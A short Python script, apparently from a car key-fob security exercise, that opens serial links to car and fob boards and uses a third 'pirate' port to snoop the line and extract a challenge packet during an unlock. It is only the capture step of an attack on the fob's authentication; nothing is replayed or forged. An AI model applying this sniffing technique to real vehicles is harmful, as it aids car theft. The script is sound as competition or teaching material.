import serial

#car device
car = serial.Serial('/dev/cu.usbmodem0E2349AA1', 115200, timeout=1)
#fob device
fob = serial.Serial('/dev/cu.usbmodem0E2349B71', 115200, timeout=1)

#snooper on car <--> fob communication line (connect rx to fob rx)
pirate = serial.Serial('/dev/cu.something', 115200, timeout=1)

# Step 1: get a valid packet capture
# [press unlock button]

packets = pirate.read(10000)
chal_pkt = packets[packets.index(b'0opsfC'):packets.index(b'0opsfC') + 472] # challenge packet


